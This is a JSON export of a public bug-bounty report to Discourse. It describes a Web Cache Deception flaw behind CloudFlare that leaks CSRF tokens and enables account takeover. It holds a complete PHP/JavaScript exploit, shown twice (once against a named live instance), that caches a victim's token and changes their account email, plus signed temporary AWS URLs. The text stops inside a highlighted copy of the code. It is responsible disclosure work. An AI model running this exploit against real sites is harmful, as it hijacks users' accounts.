{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-07-09T18:00:09.574Z", 
    "voters": [
        "jokebookservice1", 
        "foobar7", 
        "spam404", 
        "kapytein", 
        "dawgyg", 
        "marotagem_vrt", 
        "asad0x01_", 
        "eveeez", 
        "geeknik", 
        "michan001", 
        "and 29 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "256.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 260697, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "vulnerability_information": "Hi,\n\nI noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting `try.discourse.org` but the same underlying issue can be seen there as well even though it's not exploitable on that specific domain.\n\nThe TL;DR of issue is basically: `Discourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens`.\n\nAs you might understand due to this, the PoC below is not working on `try.discourse.org`. I haven't provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.\n\n### Background\n\nYou might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. \n\nAny URL having a file ending with one of [CloudFlare's mime types](https://support.cloudflare.com/hc/en-us/articles/200172516-Which-file-extensions-does-Cloudflare-cache-for-static-content-) will be cached for the whole region. Remember, a region is **big** and there are only 13 of them in total (in my case, the region is Western Europe). Here's a reference from [CloudFlare about their regions](https://support.cloudflare.com/hc/en-us/articles/115000540888-Load-Balancing-Geographic-Regions).\n\nThis attack vector was coined by **Omer Gil** earlier this year ( https://www.slideshare.net/OmerGil/web-cache-deception-attack ).\n\n### Technical details\n\nThe issue with Discourse is that there's a lot of routes which all of them exposes the user's CSRF-token as well as the user's username in the header. This applies not only to status `200` but also to status `404`.\n\nHere are some routes which will return status `200` on `try.discourse.org` even if we have appended `.css` on them (which is a trigger for CloudFlare to cache this URL):\n\n```\n/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n```\nResults in:\n\n```\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/card_badge\n```\n(This seems to be a general issue with the `X-Discourse-Route: users/*` routes)\n\nAlso, the normal 404-page actually reveals the current user's CSRF token (this request is done while being signed in):\n\n```\nGET /u/x.css HTTP/1.1\nHost: try.discourse.org\n\n<meta name=\"csrf-token\" content=\"aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==\" />\n```\n\nYou currently don't have `try.discourse.org` behind CloudFlare, but I've verified with a few instances that I noticed did.\n\nWhat you will see is the following:\n\nIssuing the following request twice while being signed in:\n\n```\nGET /u/x.css HTTP/1.1\n```\n\nWill lead to:\n```\nCF-Cache-Status: HIT\n```\n\nAs well as:\n\n```\nX-Discourse-Username: test\n\n<meta name=\"csrf-token\" content=\"6bE...VnlQ==\" />\n```\n\nSame thing with `/u/my/preferences.css`.\n\nThe issue is that none of these routes, exposing the CSRF-token and the username, has any `Pragma`, `Cache-Control` or `Expire`-headers, so there's nothing that tells CloudFlare not to cache these URLs.\n\n### PoC\n\nYou need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:\n\n{F213373}\n\nNow, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there's only 13 regions in total.\n\nWhat this script will do is this:\n\n1. Victim is signed in to a Discourse instance which is behind a CloudFlare-proxy\n2. Victim vists a malicious page by the attacker\n3. The page will issue three requests using `img`-tags to `/u/$rand.css`, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token\n4. After the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).\n5. The script will extract the username from the `X-Discourse-Username` header and the CSRF-token from the HTML\n6. The PHP-script will return these two values to the malicious site, and a form will be crafted:\n```\nPOST /users/$username/preferences/email.json HTTP/1.1\n\u00a0\n_method=PUT&email=$attacker_email&authenticity_token=$csrf_token\n```\n   \n7. Email is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.\n\nHere's the script. It seems like `_forum_session`-token has `SameSite=lax` which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.\n\n```php\n<?\n$discourse = \"https://discourse.instance.behind.cloudflare.proxy\"; //like https://try.discourse.org but behind CloudFlare\n$email_to_change_to = \"changetothis@example.com\";\n\nif(!empty($_GET['fetch'])) {\n\t$f = @intval($_GET['f']);\n\t$ctx = stream_context_create(array('http' => array('ignore_errors' => true)));\n\t$data = file_get_contents($discourse.'/u/'.$f.'.css', false, $ctx);\n\tpreg_match('/name=\"csrf-token\" content=\"([a-zA-Z0-9\\/=+]+)\"/', $data, $matches);\n\tif(!empty($matches[1])) {\n\t\tpreg_match('/X-Discourse-Username: (.*)/', implode(\"\\n\", $http_response_header), $name_matches);\n\t\techo $matches[1].';'.$name_matches[1];\n\t} else {\n\t\techo 'error';\n\t}\n\texit;\n}\n#random file to taint with csrf-token\n$rand = mt_rand(100000,999999);\n?>\n<html>\n  <body>\n\t<img src=\"<?=$discourse?>/u/<?=$rand?>.css\" />\n\t<img src=\"<?=$discourse?>/u/<?=$rand?>.css\" />\n\t<img src=\"<?=$discourse?>/u/<?=$rand?>.css\" onerror=\"f()\" />\n<script>\nvar user = '', change_email_to = '<?=$email_to_change_to?>';\nfunction f() {\n\tfetch('?fetch=1&f=<?=$rand?>').then(function(e){return e.text()}).then(function(e){\n\t\tif(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }\n\t\tuser = e.split(';')[1];\n\t\tdocument.getElementById('f').action = '<?=$discourse?>/users/'+user+'/preferences/email'\n\t\tsubmitRequest(e.split(';')[0])\n\t})\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n\tif(xhr.readyState == 4) {\n\t\talert('Account email for ' + user + ' has been changed to: ' + change_email_to);\n\t}\n  };\n  xhr.open(\"POST\", \"<?=$discourse?>/users/\"+user+\"/preferences/email.json\", true);\n  xhr.setRequestHeader(\"Accept\", \"text\\/html\");\n  xhr.setRequestHeader(\"Content-Type\", \"application\\/x-www-form-urlencoded\");\n  xhr.withCredentials = true;\n  var body = \"_method=PUT&email=\" + encodeURIComponent(change_email_to) +\"&authenticity_token=\" + encodeURIComponent(csrf);\n  var aBody = new Uint8Array(body.length);\n  for (var i = 0; i < aBody.length; i++)\n    aBody[i] = body.charCodeAt(i); \n  xhr.send(new Blob([aBody]));\n}\n</script>\n    <form action=\"\" id=\"f\" method=\"POST\">\n      <input type=\"hidden\" name=\"&#95;method\" value=\"PUT\" />\n      <input type=\"hidden\" name=\"email\" value=\"<?=$email_to_change_to?>\" />\n      <input type=\"hidden\" name=\"authenticity&#95;token\" id=\"csrf\" value=\"\" />\n      <input type=\"submit\" style=\"display: none;\" value=\"Submit request\" />\n\t  Please wait...\n    </form>\n  </body>\n</html>\n```\n\nIf you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:\n\n{F213374}\n\n### Mitigations\n\nAdd the `no-cache` headers, `Cache-Control` and/or `Expire` on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the `X-Discourse-Username` is returned.\n\nLet me know if you need any additional information.\n\nRegards,\nFrans", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "low", 
        "author_type": "Team"
    }, 
    "title": "CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)", 
    "is_member_of_team?": null, 
    "vote_count": 39, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2018-08-08T18:00:09.704Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$256", 
    "attachments": [
        {
            "file_name": "Screen_Shot_2017-08-16_at_14.07.00.png", 
            "type": "image/png", 
            "id": 213373, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/213/373/497fa800c168379e2b4afa85cc365d59676b36e2/Screen_Shot_2017-08-16_at_14.07.00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221812Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0ce02a7b5411c9e264f86566afbc0d5fdee13324d59500353fda7e1532d14295"
        }, 
        {
            "file_name": "Screen_Shot_2017-08-16_at_14.56.30.png", 
            "type": "image/png", 
            "id": 213374, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/213/374/62bc0a155ef9b43daa0e3d8a4c06620107307581/Screen_Shot_2017-08-16_at_14.56.30.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221812Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3712e636bedb480841dff7a58bdb5d26a23185a5f991088cd5434bf939fc614f"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-08-28T20:18:09.487Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-28T20:18:09.487Z", 
            "actor": {
                "username": "asuka", 
                "url": "/asuka", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/923/c73a42c0f9ea47ce5554fbab2411978f2bb985f8_medium.jpg?1474068574"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hello @fransrosen, thanks for your report! We need some more information before we can properly review this report. Is it possible you could provide a PoC instance behind Cloudflare showing how the issue could be exploited?  Thanks again for your report and we hope to hear back from you soon. ", 
            "markdown_message": "<p>Hello <a href=\"/fransrosen\">@fransrosen</a>, thanks for your report! We need some more information before we can properly review this report. Is it possible you could provide a PoC instance behind Cloudflare showing how the issue could be exploited?  Thanks again for your report and we hope to hear back from you soon. </p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 1961214, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/981/8531fd700671a5b86646925d06969b7af7670bf0/AlgoliaTakeover.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221812Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9be7e2f54f233b231dca54e78d241e353d81d3f9c27898afb751028e987130e5", 
                    "type": "video/mp4", 
                    "id": 253981, 
                    "filename": "AlgoliaTakeover.mp4"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/980/47ff68d15e126d4585771322bb6e2e3ca79d1961/Screen_Shot_2018-01-14_at_23.44.51.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221812Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=42c2e44a443d58dc6e2e9621b26995a9ed2e0aa229ec0a48d8a6a07cfeb08dae", 
                    "type": "image/png", 
                    "id": 253980, 
                    "filename": "Screen_Shot_2018-01-14_at_23.44.51.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/979/852c304f53383523085e98d88e73b8563c3239fe/Screen_Shot_2018-01-14_at_23.44.58.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221812Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=22fbb0d2a4dfc77ae6331ad9c90f471f1d2f34fb825cc0125c633e6063ceb4d8", 
                    "type": "image/png", 
                    "id": 253979, 
                    "filename": "Screen_Shot_2018-01-14_at_23.44.58.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2018-01-14T22:47:57.598Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-01-14T22:49:50.860Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hi,\nSorry for the late reply here. I finally got an approval from Algolia to make my PoC using their Discourse-instance, which was also the site I found this on initially. Their setup of Discourse is using SSO to their regular site, but I can still do the account takeover by changing the email address in Discourse.\n\nThe bug is reproducible in Firefox, for some reason the SameSite: Lax is not really working in that browser, so `_forum_session` is still sent with the image embedding from my test-page, and the form-posting with the CSRF-token actually also works. I'm testing with Firefox 57.0.4 in macOS 10.13.2.\n\nYou need to run the PHP-code in the same region as you're in when trying, this is because the CloudFlare region is the one doing the cache of `.css`. As mentioned, CloudFlare only have 13 regions so it should be fairly straight forward.\n\nMy code looks like this in the demo:\n\n```php\n<?\n$discourse = \"https://discourse.algolia.com\";\n$email_to_change_to = \"test99990@yoski.co\";\n$file = \"/u/%d.css\";\n\nif(!empty($_GET['fetch'])) {\n\t$f = @intval($_GET['f']);\n\t$file = sprintf($file, $f);\n\t$ctx = stream_context_create(array('http' => array('ignore_errors' => true)));\n\t$data = file_get_contents($discourse.$file, false, $ctx);\n\tpreg_match('/name=\"csrf-token\" content=\"([a-zA-Z0-9\\/=+]+)\"/', $data, $matches);\n\tif(!empty($matches[1])) {\n\t\tpreg_match('/X-Discourse-Username: (.*)/', implode(\"\\n\", $http_response_header), $name_matches);\n\t\techo $matches[1].';'.$name_matches[1];\n\t} else {\n\t\techo 'error';\n\t}\n\texit;\n}\n#random file to taint with csrf-token\n$rand = mt_rand(100000,999999);\n$file = sprintf($file, $rand);\n?>\n<html>\n  <body>\n\t<img src=\"<?=$discourse.$file?>\" />\n\t<img src=\"<?=$discourse.$file?>\" />\n\t<img src=\"<?=$discourse.$file?>\" onerror=\"f()\" />\n<script>\nvar user = '', change_email_to = '<?=$email_to_change_to?>';\nfunction f() {\n\tfetch('?fetch=1&f=<?=$rand?>').then(function(e){return e.text()}).then(function(e){\n\t\tif(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }\n\t\tuser = e.split(';')[1];\n\t\tdocument.getElementById('f').action = '<?=$discourse?>/users/'+user+'/preferences/email'\n\t\tsubmitRequest(e.split(';')[0])\n\t})\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n\tif(xhr.readyState == 4) {\n\t\talert('Account email for ' + user + ' has been changed to: ' + change_email_to);\n\t}\n  };\n  xhr.open(\"POST\", \"<?=$discourse?>/users/\"+user+\"/preferences/email.json\", true);\n  xhr.setRequestHeader(\"Accept\", \"text\\/html\");\n  xhr.setRequestHeader(\"Content-Type\", \"application\\/x-www-form-urlencoded\");\n  xhr.withCredentials = true;\n  var body = \"_method=PUT&email=\" + encodeURIComponent(change_email_to) +\"&authenticity_token=\" + encodeURIComponent(csrf);\n  var aBody = new Uint8Array(body.length);\n  for (var i = 0; i < aBody.length; i++)\n    aBody[i] = body.charCodeAt(i); \n  xhr.send(new Blob([aBody]));\n}\n</script>\n    <form action=\"\" id=\"f\" method=\"POST\">\n      <input type=\"hidden\" name=\"&#95;method\" value=\"PUT\" />\n      <input type=\"hidden\" name=\"email\" value=\"<?=$email_to_change_to?>\" />\n      <input type=\"hidden\" name=\"authenticity&#95;token\" id=\"csrf\" value=\"\" />\n      <input type=\"submit\" style=\"display: none;\" value=\"Submit request\" />\n\t  Please wait...\n    </form>\n  </body>\n</html>\n```\n\nAnd the flow looks like this:\n\n1. Sign up for Algolia at https://www.algolia.com/users/sign_up\n2. When done, go to https://discourse.algolia.com/ and \"Log in\"\n3. Make sure the PHP-file is running on the same CloudFlare region, you can try it locally by: `php -S localhost:8000 algolia.php`\n4. Change the email address in the PHP-script to something else maybe, so you see that you indeed get the confirmation email sent to the new address to confirm the change.\n5. Go to `http://localhost:8000` in Firefox.\n\nYou should see an alert that the email was changed. This is also the point when the attacker gets a \"Confirm your new address\" to their inbox as my video shows.\n\nPoC-video:\n{F253981}\n\nThe reason why all this works to refresh everyones memory on this bug, is that any path under `/u/*.css` will respond when signed in with CSRF-tokens in the error page. Since there are no proper Cache-Control headers on this 404 page, CloudFlare will happily cache the file since it thinks it's a CSS-file. If there would be a `Cache-Control: no-cache` whenever CSRF-tokens are in the templates, this attack would not work.\n\nAlso, to show you that it does in fact get cached on CloudFlare, here are the same URL tried in my region, and all of them are showing the user's CSRF-token when the file was requested, which is the one I'm using to trigger the email-change:\n\n{F253980}\n{F253979}\n```\nlocal @ cache $ curl -s https://discourse.algolia.com/u/469843.css | grep csrf-token\n<meta name=\"csrf-token\" content=\"CaTKE2wq4jczCZO+LTasy6SvBBHxaYJr9giqym1PSaCtgz5IgofUOmrufGYdrnTgS8ZHM67/SPgUAroHv1zMFw==\" />\n```\n\nThe only setup Algolia made here was to put the Discourse-application behind CloudFlare. This is a regular setup if you're using CloudFlare's proxy to speed up the website and to hide the origin and sometimes make sure you're protected against DDoS.\n\nHope this helps, and sorry for my late reply.\n\nRegards,\nFrans\n\n", 
            "markdown_message": "<p>Hi,<br>\nSorry for the late reply here. I finally got an approval from Algolia to make my PoC using their Discourse-instance, which was also the site I found this on initially. Their setup of Discourse is using SSO to their regular site, but I can still do the account takeover by changing the email address in Discourse.</p>\n\n<p>The bug is reproducible in Firefox, for some reason the SameSite: Lax is not really working in that browser, so <code>_forum_session</code> is still sent with the image embedding from my test-page, and the form-posting with the CSRF-token actually also works. I&#39;m testing with Firefox 57.0.4 in macOS 10.13.2.</p>\n\n<p>You need to run the PHP-code in the same region as you&#39;re in when trying, this is because the CloudFlare region is the one doing the cache of <code>.css</code>. As mentioned, CloudFlare only have 13 regions so it should be fairly straight forward.</p>\n\n<p>My code looks like this in the demo:</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?</span>\n<span class=\"nv\">$discourse</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;https://discourse.algolia.com&quot;</span><span class=\"p\">;</span>\n<span class=\"nv\">$email_to_change_to</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;test99990@yoski.co&quot;</span><span class=\"p\">;</span>\n<span class=\"nv\">$file</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;/u/%d.css&quot;</span><span class=\"p\">;</span>\n\n<span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"k\">empty</span><span class=\"p\">(</span><span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">&#39;fetch&#39;</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$f</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"o\">@</span><span class=\"nb\">intval</span><span class=\"p\">](</span><span class=\"o\">/</span><span class=\"nb\">intval</span><span class=\"p\">)(</span><span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">&#39;f&#39;</span><span class=\"p\">]);</span>\n    <span class=\"nv\">$file</span> <span class=\"o\">=</span> <span class=\"nb\">sprintf</span><span class=\"p\">(</span><span class=\"nv\">$file</span><span class=\"p\">,</span> <span class=\"nv\">$f</span><span class=\"p\">);</span>\n    <span class=\"nv\">$ctx</span> <span class=\"o\">=</span> <span class=\"nb\">stream_context_create</span><span class=\"p\">(</span><span class=\"k\">array</span><span class=\"p\">(</span><span class=\"s1\">&#39;http&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"k\">array</span><span class=\"p\">(</span><span class=\"s1\">&#39;ignore_errors&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"kc\">true</span><span class=\"p\">)));</span>\n    <span class=\"nv\">$data</span> <span class=\"o\">=</span> <span class=\"nb\">file_get_contents</span><span class=\"p\">(</span><span class=\"nv\">$discourse</span><span class=\"o\">.</span><span class=\"nv\">$file</span><span class=\"p\">,</span> <span class=\"kc\">false</span><span class=\"p\">,</span> <span class=\"nv\">$ctx</span><span class=\"p\">);</span>\n    <span class=\"nb\">preg_match</span><span class=\"p\">(</span><span class=\"s1\">&#39;/name=&quot;csrf-token&quot; content=&quot;([a-zA-Z0-9\\/=+]+)&quot;/&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$data</span><span class=\"p\">,</span> <span class=\"nv\">$matches</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"k\">empty</span><span class=\"p\">(</span><span class=\"nv\">$matches</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n        <span class=\"nb\">preg_match</span><span class=\"p\">(</span><span class=\"s1\">&#39;/X-Discourse-Username: (.*)/&#39;</span><span class=\"p\">,</span> <span class=\"nb\">implode</span><span class=\"p\">(</span><span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">,</span> <span class=\"nv\">$http_response_header</span><span class=\"p\">),</span> <span class=\"nv\">$name_matches</span><span class=\"p\">);</span>\n        <span class=\"k\">echo</span> 